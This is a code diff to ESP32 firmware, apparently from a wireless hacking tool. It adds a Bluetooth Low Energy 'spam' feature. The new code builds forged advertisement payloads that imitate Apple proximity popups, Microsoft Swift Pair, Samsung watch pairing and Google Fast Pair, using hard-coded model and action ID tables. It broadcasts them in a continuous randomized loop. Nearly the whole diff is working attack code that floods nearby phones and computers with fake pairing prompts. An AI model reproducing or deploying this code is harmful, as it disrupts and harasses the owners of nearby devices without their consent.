@@ -64,6 +64,140 @@ static uint16_t *last_company_id = NULL;
 static TickType_t last_detection_time = 0;
 static void ble_pcap_callback(struct ble_gap_event *event, size_t len);
 
+// spam tracking vars
+static volatile uint32_t spam_adv_count = 0;
+static esp_timer_handle_t spam_log_timer = NULL;
+static int spam_log_interval_ms = 5000;
+static TaskHandle_t spam_task_handle = NULL;
+static volatile bool spam_running = false;
+static ble_spam_type_t current_spam_type = BLE_SPAM_APPLE;
+
+// spam payload data
+const uint8_t IOS1[] = {
+    0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b, 
+    0x0c, 0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12, 0x16
+};
+
+const uint8_t IOS2[] = {
+    0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27,
+    0x0b, 0x09, 0x02, 0x1e, 0x24
+};
+
+typedef struct {
+    uint32_t value;
+} DeviceType;
+
+const DeviceType android_models[] = {
+    {0x0001F0}, {0x000047}, {0x470000}, {0x00000A}, {0x00000B}, {0x00000D}, 
+    {0x000007}, {0x000009}, {0x090000}, {0x000048}, {0x001000}, {0x00B727}, 
+    {0x01E5CE}, {0x0200F0}, {0x00F7D4}, {0xF00002}, {0xF00400}, {0x1E89A7},
+    {0xCD8256}, {0x0000F0}, {0xF00000}, {0x821F66}, {0xF52494}, {0x718FA4}, 
+    {0x0002F0}, {0x92BBBD}, {0x000006}, {0x060000}, {0xD446A7}, {0x038B91}, 
+    {0x02F637}, {0x02D886}, {0xF00001}, {0xF00201}, {0xF00209}, {0xF00205},
+    {0xF00305}, {0xF00E97}, {0x04ACFC}, {0x04AA91}, {0x04AFB8}, {0x05A963}, 
+    {0x05AA91}, {0x05C452}, {0x05C95C}, {0x0602F0}, {0x0603F0}, {0x1E8B18}, 
+    {0x1E955B}, {0x1EC95C}, {0x06AE20}, {0x06C197}, {0x06C95C}, {0x06D8FC}, 
+    {0x0744B6}, {0x07A41C}, {0x07C95C}, {0x07F426}, {0x0102F0}, {0x054B2D}, 
+    {0x0660D7}, {0x0103F0}, {0x0903F0}, {0xD99CA1}, {0x77FF67}, {0xAA187F}, 
+    {0xDCE9EA}, {0x87B25F}, {0x1448C9}, {0x13B39D}, {0x7C6CDB}, {0x005EF9}, 
+    {0xE2106F}, {0xB37A62}, {0x92ADC9}
+};
+
+typedef struct {
+    uint8_t value;
+} WatchModel;
+
+const WatchModel watch_models[] = {
+    {0x1A}, {0x01}, {0x02}, {0x03}, {0x04}, {0x05}, {0x06}, {0x07}, 
+    {0x08}, {0x09}, {0x0A}, {0x0B}, {0x0C}, {0x11}, {0x12}, {0x13}, 
+    {0x14}, {0x15}, {0x16}, {0x17}, {0x18}, {0x1B}, {0x1C}, {0x1D}, 
+    {0x1E}, {0x20}
+};
+
+static void spam_log_timer_cb(void *arg) {
+    const char *type_name = "unknown";
+    switch (current_spam_type) {
+        case BLE_SPAM_APPLE: type_name = "apple"; break;
+        case BLE_SPAM_MICROSOFT: type_name = "microsoft"; break;
+        case BLE_SPAM_SAMSUNG: type_name = "samsung"; break;
+        case BLE_SPAM_GOOGLE: type_name = "google"; break;
+        case BLE_SPAM_RANDOM: type_name = "random"; break;
+        case BLE_SPAM_FLIPPERZERO: type_name = "flipper"; break;
+    }
+    printf("ble spam (%s): %lu packets sent\n", type_name, (unsigned long)spam_adv_count);
+    TERMINAL_VIEW_ADD_TEXT("ble spam (%s): %lu packets sent\n", type_name, (unsigned long)spam_adv_count);
+}
+
+// forward declarations for spam payload builders
+static void generate_random_name(char *name, size_t max_len);
+static void build_microsoft_mfg(const char *name, uint8_t *buf, size_t *len);
+static void build_apple_mfg(uint8_t *buf, size_t *len);
+static void build_samsung_mfg(uint8_t *buf, size_t *len);
+static void build_google_mfg(uint8_t *buf, size_t *len);
+
+static void spam_task(void *arg) {
+    while (spam_running) {
+        if (ble_gap_adv_active()) {
+            ble_gap_adv_stop();
+        }
+
+        struct ble_hs_adv_fields fields;
+        memset(&fields, 0, sizeof(fields));
+        fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
+
+        uint8_t mfg_buf[31];
+        size_t mfg_len = 0;
+
+        if (current_spam_type == BLE_SPAM_MICROSOFT) {
+            char name[8];
+            generate_random_name(name, sizeof(name));
+            build_microsoft_mfg(name, mfg_buf, &mfg_len);
+        } else if (current_spam_type == BLE_SPAM_APPLE) {
+            build_apple_mfg(mfg_buf, &mfg_len);
+        } else if (current_spam_type == BLE_SPAM_SAMSUNG) {
+            build_samsung_mfg(mfg_buf, &mfg_len);
+        } else if (current_spam_type == BLE_SPAM_GOOGLE) {
+            build_google_mfg(mfg_buf, &mfg_len);
+        } else if (current_spam_type == BLE_SPAM_RANDOM) {
+            int rand_type = esp_random() % 4;
+            if (rand_type == 0) {
+                char name[8];
+                generate_random_name(name, sizeof(name));
+                build_microsoft_mfg(name, mfg_buf, &mfg_len);
+            } else if (rand_type == 1) {
+                build_apple_mfg(mfg_buf, &mfg_len);
+            } else if (rand_type == 2) {
+                build_samsung_mfg(mfg_buf, &mfg_len);
+            } else {
+                build_google_mfg(mfg_buf, &mfg_len);
+            }
+        }
+
+        fields.mfg_data = mfg_buf;
+        fields.mfg_data_len = mfg_len;
+
+        if (ble_gap_adv_set_fields(&fields) == 0) {
+            struct ble_gap_adv_params adv_params;
+            memset(&adv_params, 0, sizeof(adv_params));
+            adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
+            adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;
+
+            uint8_t own_addr_type;
+            if (ble_hs_id_infer_auto(0, &own_addr_type) == 0) {
+                uint32_t adv_ms = (esp_random() % 151) + 100;  // 100-250 ms
+                if (ble_gap_adv_start(own_addr_type, NULL, adv_ms, &adv_params, NULL, NULL) == 0) {
+                    spam_adv_count++;
+                }
+            }
+        }
+
+        uint32_t sleep_ms = (esp_random() % 151) + 100; // match delay
+        vTaskDelay(pdMS_TO_TICKS(sleep_ms));
+    }
+    spam_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
 static void notify_handlers(struct ble_gap_event *event, int len) {
     for (int i = 0; i < handler_count; i++) {
         if (handlers[i].handler) {
@@ -1100,5 +1234,137 @@ void ble_select_flipper(int index) {
     TERMINAL_VIEW_ADD_TEXT("Track start: Flipper %d\n", index);
 }
 
+static void build_microsoft_mfg(const char *name, uint8_t *buf, size_t *len) {
+    size_t name_len = strlen(name);
+    buf[0] = 0x06;
+    buf[1] = 0x00;
+    buf[2] = 0x03;
+    buf[3] = 0x00;
+    buf[4] = 0x80;
+    memcpy(&buf[5], name, name_len);
+    *len = 5 + name_len;
+}
+
+static void build_apple_mfg(uint8_t *buf, size_t *len) {
+    buf[0] = 0x4C;
+    buf[1] = 0x00;
+    buf[2] = 0x0F;
+    buf[3] = 0x05;
+    buf[4] = 0xC1;
+    
+    int use_ios2 = esp_random() % 2;
+    if (use_ios2) {
+        buf[5] = IOS2[esp_random() % (sizeof(IOS2)/sizeof(IOS2[0]))];
+    } else {
+        buf[5] = IOS1[esp_random() % (sizeof(IOS1)/sizeof(IOS1[0]))];
+    }
+    
+    esp_fill_random(&buf[6], 3);
+    buf[9] = 0x00;
+    buf[10] = 0x00;
+    buf[11] = 0x10;
+    esp_fill_random(&buf[12], 3);
+    *len = 15;
+}
+
+static void build_samsung_mfg(uint8_t *buf, size_t *len) {
+    buf[0] = 0x75;
+    buf[1] = 0x00;
+    buf[2] = 0x01;
+    buf[3] = 0x00;
+    buf[4] = 0x02;
+    buf[5] = 0x00;
+    buf[6] = 0x01;
+    buf[7] = 0x01;
+    buf[8] = 0xFF;
+    buf[9] = 0x00;
+    buf[10] = 0x00;
+    buf[11] = 0x43;
+    uint8_t model = watch_models[esp_random() % (sizeof(watch_models)/sizeof(watch_models[0]))].value;
+    buf[12] = model;
+    *len = 13;
+}
+
+static void build_google_mfg(uint8_t *buf, size_t *len) {
+    uint32_t device_id = android_models[esp_random() % (sizeof(android_models)/sizeof(android_models[0]))].value;
+    buf[0] = 0xE0;
+    buf[1] = 0x00;
+    buf[2] = 0x00;
+    buf[3] = (device_id >> 16) & 0xFF;
+    buf[4] = (device_id >> 8) & 0xFF;
+    buf[5] = device_id & 0xFF;
+    buf[6] = (esp_random() % 120) - 100;
+    *len = 7;
+}
+
+void ble_start_ble_spam(ble_spam_type_t type) {
+    if (spam_running) {
+        printf("spam already running, stopping first...\n");
+        ble_stop_ble_spam();
+        vTaskDelay(pdMS_TO_TICKS(200));
+    }
+
+    if (!ble_initialized) {
+        ble_init();
+    }
+
+    if (!wait_for_ble_ready()) {
+        printf("ble not ready for spam\n");
+        return;
+    }
+
+    current_spam_type = type;
+    spam_adv_count = 0;
+    spam_running = true;
+
+    if (xTaskCreate(spam_task, "ble_spam", 4096, NULL, 5, &spam_task_handle) != pdPASS) {
+        printf("failed to create spam task\n");
+        spam_running = false;
+        return;
+    }
+
+    if (spam_log_timer == NULL) {
+        esp_timer_create_args_t targs = {
+            .callback = spam_log_timer_cb,
+            .arg = NULL,
+            .name = "spam_log"
+        };
+        esp_timer_create(&targs, &spam_log_timer);
+    }
+    esp_timer_start_periodic(spam_log_timer, spam_log_interval_ms * 1000);
+
+    const char *type_name = "unknown";
+    switch (type) {
+        case BLE_SPAM_APPLE: type_name = "apple"; break;
+        case BLE_SPAM_MICROSOFT: type_name = "microsoft"; break;
+        case BLE_SPAM_SAMSUNG: type_name = "samsung"; break;
+        case BLE_SPAM_GOOGLE: type_name = "google"; break;
+        case BLE_SPAM_RANDOM: type_name = "random"; break;
+        case BLE_SPAM_FLIPPERZERO: type_name = "flipper"; break;
+    }
+    printf("ble spam advertising started (%s)\n", type_name);
+}
+
+void ble_stop_ble_spam(void) {
+    spam_running = false;
+    
+    if (spam_task_handle != NULL) {
+        vTaskDelay(pdMS_TO_TICKS(150));
+        if (spam_task_handle != NULL) {
+            vTaskDelete(spam_task_handle);
+            spam_task_handle = NULL;
+        }
+    }
+    
+    if (spam_log_timer) {
+        esp_timer_stop(spam_log_timer);
+    }
+    
+    if (ble_gap_adv_active()) {
+        ble_gap_adv_stop();
+    }
+    
+    printf("ble spam advertising stopped\n");
+}
 
 #endif
